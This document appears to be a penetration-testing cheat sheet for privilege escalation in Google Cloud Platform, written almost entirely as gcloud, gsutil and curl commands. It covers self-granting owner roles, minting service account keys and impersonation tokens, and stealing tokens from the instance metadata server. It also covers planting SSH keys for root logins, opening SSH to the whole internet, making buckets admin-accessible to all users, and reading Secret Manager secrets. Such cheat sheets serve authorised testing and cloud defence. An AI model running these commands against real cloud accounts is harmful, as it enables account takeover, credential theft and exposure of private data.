# Exploitation & Privilege Escalation
## Index
* [General](#General)
* [Exploitation Enumeration](#Exploitation-Enumeration)
* [IAM Permissions](#IAM-Permissions)
  * [Set IAM policy permission](#Set-IAM-policy-permission)
  * [Custom role permission update](#Custom-role-permission-update)
* [Service Account](#Service-Account)
  * [Service Account Key Admin](#)
  * [Service Account Impersonation](#Service-Account-Key-Admin)
  * [Service Account User](#Service-Account-User)
* [Cloud Functions](#Cloud-Functions)
  * [Cloud Function code update](#Cloud-Function-code-update)
* [Compute Instance](#Compute-Instance)
  * [OAuth Scope Manipulation](#OAuth-Scope-Manipulation)
  * [SetMetaData](#SetMetaData)
  * [OsLogin](#OsLogin)
  * [Access & Identity Token Extraction](#Access-&-Identity-Token-Extraction)
* [Virtual Private Cloud](#Virtual-Private-Cloud)
  * [Firewall Rule Manipulation](#Firewall-Rule-Manipulation)
* [Cloud Storage](#Cloud-Storage)
  * [Change bucket policy](#Change-bucket-policy)
  * [Bucket access](#Bucket-access)
* [Secret Manager](#Secret-Manager)
* [Metadata server](#Metadata-server)

## General
- Google Cloud Platform has 2 user types
  - User Accounts 
    - Traditional user access with password 
  - Service Accounts 
    - Don’t have passwords 
    - Every GCP project has a “Default” service account
    - Default will get bound to instances if no other is set
    - EVERY process running on the instance can authenticate as the service account
- Got shell on a compute instance?
- The default service account can access EVERY storage bucket in a project
- Intersting other cheatsheet: https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-privilege-escalation

## Exploitation enumeration
#### Check accessible projects
```
gcloud projects list
```

#### Set a project
```
gcloud config set project <PROJECT NAME> 
```

#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID>
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### Oneliner to check permissions of a user on all projects
```
GCUSER=<USER EMAIL>
gcloud projects list | awk '{print $1}' | tail -n +2  | while read project; do echo "\n [+] checking: $project\n" && gcloud projects get-iam-policy $project --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)"; done
```

#### Oneliner to check permissions of a user on all service accounts
```
GCUSER=<USER EMAIL>
gcloud iam service-accounts list | rev | awk '{print $2}' | rev | tail -n +2 | while read serviceaccount; do echo "\n [+] checking: $serviceaccount\n" && gcloud iam service-accounts get-iam-policy $serviceaccount --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER 2>/dev/null" --format="value(bindings.role)"; done
```

## IAM Policy Permissions
#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### List all permission in custom role
```
gcloud iam roles describe <ROLE> --project <PROJECT ID>
```

### Set IAM policy permission
- User or Service account can set IAM policy on Org / Folder / Project or individual resource level
- Roles: `roles/resourcemanager.organizationAdmin`, `roles/owner`, `roles/[resource-admin]`
- Permissions:
  - Organization Level: `resourcemanager.organizations.setIamPolicy`
  - Folder Level: `resourcemanager.folders.setIamPolicy`
  - Project Level: `resourcemanager.projects.setIamPolicy`
  - Individual Resource Level: `iam.serviceaccounts.setiampolicy`, `compute.instances.setIamPolicy`, `storage.buckets.setIamPolicy`
 
#### Adding a policy binding to the IAM policy of a project - User
```
gcloud projects add-iam-policy-binding <PROJECT ID> --member='user:<USER EMAIL>' --role='roles/owner'
```

#### Adds a policy binding to the IAM policy of a project - Service Account
```
gcloud projects add-iam-policy-binding <PROJECT ID> --member='serviceAccount:<USER EMAIL>' --role='roles/editor'
```

### Custom role permission update
- Custom role contain user defined permission, can only be attached to organization or project level
- Roles: `roles/iam.organizationRoleAdmin`, `roles/iam.roleAdmin`
- Permissions: `iam.roles.update`

#### Set IAM policy on project level
```
gcloud iam roles update <ROLE NAME> --project=<PROJECT ID> --add-permissions=resourcemanager.projects.setIamPolicy
```

## Service Account
#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### List service accounts on project level
```
gcloud iam service-accounts list
```

#### Get the IAM policy for a service account 
```
gcloud iam service-accounts get-iam-policy <SERVICE ACCOUNT ID>
```

### Service Account Key Admin
- Key admin can create a new key for service account. Max 10 keys per service account.
- Roles: `roles/iam.serviceAccountAdmin`, `roles/iam.serviceAccountKeyAdmin`
- Permissions: `iam.serviceAccountkeys.create`

#### List keys associated with the specified service account
```
gcloud iam service-accounts keys list --iam-account <SERVICE ACCOUNT ID>
```

#### Create a new key for specified service account.
```
gcloud iam service-accounts keys create key.json --iam-account <SERVICE ACCOUNT ID>
```

### Service Account Impersonation
- Roles: `roles/iam.serviceAccountTokenCreator`
- Permissions:
  - `iam.serviceAccounts.getAccessToken`: lets you create OAuth 2.0 access tokens
  - `iam.serviceAccounts.getOpenIdToken`: lets you create OpenID Connect (OICD) ID tokens
- This role lets the user impersonate service acounts. Allow principals to create short-lived credentials for service accounts, or to use the `--impersonate-service-account` flag for gcloud cli.

#### Create short-lived access token
```
gcloud auth print-access-token --impersonate-service-account <Impersonate Service Account Email>
```

#### Verify short-lived access token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<ACCESS TOKEN>
```

#### Create short-lived identity token
```
gcloud auth print-identity-token --impersonate-service-account <Impersonate Service Account Email>
```

#### Verify short-lived identity token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?identity_token=<IDENTITY TOKEN>
```

### Service Account User
- Allows principals to indirectly access all the resources that the service account can acces.
- Principal can attach service account to any compute resource and access it’s permissions.
- Roles: `roles/iam.serviceAccountUser`
- Permissions: `iam.serviceAccounts.actAs`

#### Create cloud function with attached service account
```
gcloud functions deploy [my-fun] --timeout 539 --trigger-http --source [function-source] --runtime python37 --entry-point hello_world  --service-account [service-account-email]
```

#### Invoke cloud function and retrieve temporary credential
```
gcloud functions call function-name --data '{}'
```

## Cloud Functions
#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### List all cloud functions on project level
```
gcloud functions list
```

### Cloud Function code update
- Create a new function or modify the source code of any existing function.
- Roles: `roles/cloudfunctions.admin`
- Permissions: `cloudfunctions.functions.create`, `cloudfunctions.functions.update`, `cloudfunctions.functions.call` 

#### Create / Update existing cloud function source code
```
gcloud functions deploy <CLOUD FUNCTION NAME> --timeout 539 --source <PATH TO SOURCE CODE> --runtime python37
```

#### Invoke cloud function
```
gcloud functions call <CLOUD FUNCTION NAME> --data '{}'
```

## Compute Instance
#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### List all compute instances on project level
```
gcloud compute instances list
```

#### Get information about an instance
```
gcloud compute instances describe <INSTANCE>
```

### OAuth Scope Manipulation
- Oauth scope defines the access of the virtual machine?
- Roles: `roles/compute.admin`, `roles/compute.instanceAdmin`, `roles/compute.instanceAdmin.v1`, `Service Account User`
- Permissions: `compute.instances.setServiceAccount`

#### Stop compute instance
```
gcloud compute instances stop <INSTANCE>
```

#### Change service account or oauth scope
```
gcloud compute instances set-service-account <INSTANCE> --service-account <SERVICE ACCOUNT NAME> --scopes <SCOPE> --zone <ZONE>
```

#### Start compute instance
```
gcloud compute instances start <INSTANCE>
```

### SetMetaData
- Metadata contains SSH keys and can be set on project level or instance level. It is possible to add a ssh key
- Project Level
  - Roles: `roles/compute.instanceAdmin.v1`, `roles/iam.serviceAccountUser`
  - Permissions: `compute.projects.setCommonInstanceMetadata`, `iam.serviceAccounts.actAs`
- Instance Level
  - Roles: `roles/compute.instanceAdmin.v1`, `roles/iam.serviceAccountUser`
  - Permissions: `compute.instances.setMetadata`, `iam.serviceAccounts.actAs`

#### Get the information about project metadata
```
gcloud compute project-info describe
```

#### Generate ssh key pair
```
ssh-keygen
```

#### Arrange ssh public key in this format in a file
```
username:ssh-rsa [AAAAB3NzaC1yc2EAAAADAQABAAABAQ]
```

#### Set ssh key value in the project metadata
```
gcloud compute project-info add-metadata --metadata-from-file=ssh-keys=<KEY FILE>
```

#### Set ssh key value in the instance metadata
```
gcloud compute instances add-metadata <VM NAME> --metadata-from-file-ssh-keys=<KEY FILE>
```

### OsLogin
- OS Login is used to manage SSH access to gcp instances using IAM without having to create and manage individual SSH keys. 
- Oslogin allow two type of ssh access privilege. Root user & Non root user.
- Supports mfa
- Enabled by the metadata setting `enable-oslogin=TRUE`
- Roles: `roles/compute.osAdminLogin`, `roles/compute.osLogin`
- Permissions: `compute.instances.osAdminLogin`, `compute.instances.osLogin`

#### SSH to compute instance using oslogin.
```
gcloud compute ssh --zone=<ZONE> <VM NAME>
```

### Access & Identity Token Extraction
- After gaining command execution on a VM

#### Execute commands on VM's
- Can connect with gcloud ssh command, command can be retrieved from the portal in VM instances, remote access --> View gcloud command, looks like:
```
gcloud beta compute ssh --zone "us-east1-b" "test-instance-1" --project "test-gcloud-project"
```

#### Access token
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<SVC_ACCT>/token"
```

#### Retrieve access token scope
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<SVC_ACCT>/scope
```

#### Verify access token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<ACCESS TOKEN>
```

#### Identity token
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/[SVC_ACCT]/identity"
```

#### Verify identity token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?identity_token=[IdentityToken]
```

## Virtual Private Cloud
#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### List all permission in custom role
```
gcloud iam roles describe <ROLE> --project <PROJECT ID>
```

### Firewall Rule Manipulation
- Roles: `roles/compute.admin`, `roles/compute.securityAdmin`
- Permissions: `compute.firewalls.create`, `compute.firewalls.update`, `compute.networks.updatePolicy`

#### List of all firewall rules on project level
```
gcloud compute firewall-rules list --format=json
```

#### List all compute instances on project level
```
gcloud compute instances list
```

#### Get information about an instance
```
gcloud compute instances describe <INSTANCE>
```

#### Create firewall rules for vpc
- Firewall Rules Targets - All Instance in the networks
```
gcloud compute firewall-rules create threat-rule --allow=tcp:22 --source-ranges="0.0.0.0/0" --direction=INGRESS
```

## Cloud Storage
- There are two type of IAM policy in cloud storage. 
  - Bucket Policy, uniform bucket-level access - Applied on bucket level and all objects within the bucket. 
  - ACL - Applied on individual object level. 
- Different type of principal identity in storage IAM.
  - allUsers - Unauthenticated users - anonymous access
  - allAuthenticatedUsers - all authenticated user which have google account
  - IAM - Users/ groups / service accounts within the same organization/ project control by IAM

### Change bucket policy
- Roles: `roles/storage.admin`
- Permissions: `storage.buckets.setIamPolicy`

### Get the gcp bucket subdomain for an organization
- https://github.com/initstring/cloud_enum
```
python3 cloudenum.py -k <KEYWORD>
```

#### Get the information about objects in a bucket
```
curl https://storage.googleapis.com/<BUCKET NAME>
```

#### Get the information about iam permission attached to the bucket
```
https://www.googleapis.com/storage/v1/b/<BUCKET NAME>/iam/testPermissions?permissions=[storage.buckets.dele
te&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPo
licy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&per
missions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update] 
```

#### List all roles attached to this bucket
```
gsutil iam get gs://<BUCKET NAME>
```

#### Add an admin role for allUsers
```
gsutil iam ch allUsers:admin gs://<BUCKET NAME>
```

### Bucket access
#### Check if user has default service account access
- Look for the standard default service account name that look like: 
  - PROJECT_NUMBER-compute@developer.gserviceaccount.com
  - PROJECT_ID@appspot.gserviceaccount.com
- Use service account to access buckets looking for other creds or sensitive data
```
gcloud config list
```

## Secret Manager
- Permissions are defined on secret manager
  - Project wide 
  - Individual secret wide 
- Roles: `roles/owner`, `roles/secretmanager.admin`, `roles/secretmanager.secretAccessor`
- Permissions: `secretmanager.versions.access`

#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### List all secrets by name on project level
```
gcloud secrets list
```

#### Get IAM policy on individual secret level
```
gcloud secrets get-iam-policy <SECRET>
```

#### List versions for a secret
```
gcloud secrets versions list <SECRET>
```

#### Read secret
```
gcloud secrets versions access --secret cpsa-key-json [1]
```

## Metadata server
- Metadata  endpoint on instances at 169.254.169.254
- Any public SSH keys in the metadata server get an account with root access setup
- If you can set a public key on the metadata server it will setup a brand new Linux account for you on the instance
- Need default perms set to “full access to Cloud APIs” or compute API access
  - Or… custom IAM perms: 
    - compute.instances.setMetadata
    - compute.projects.setCommonInstanceMetadata

### Create SSH key for a new username
```
ssh-keygen -t rsa -C "<USER>" -f ./<FILENAME>.key -P ""
```

#### Copy the username and key data into a file called metadata.txt in the following format:
```
<USERNAME>:<public key data in usernamekey.pub>
```

#### Update the instance metadata
```
gcloud compute instances add-metadata <instance name> --metadata-from-file ssh-keys=metadata.txt
```

#### SSH into the machine
- Now when the daemon runs it will add a new user with root privileges. Use your newly generated SSH key to SSH in.
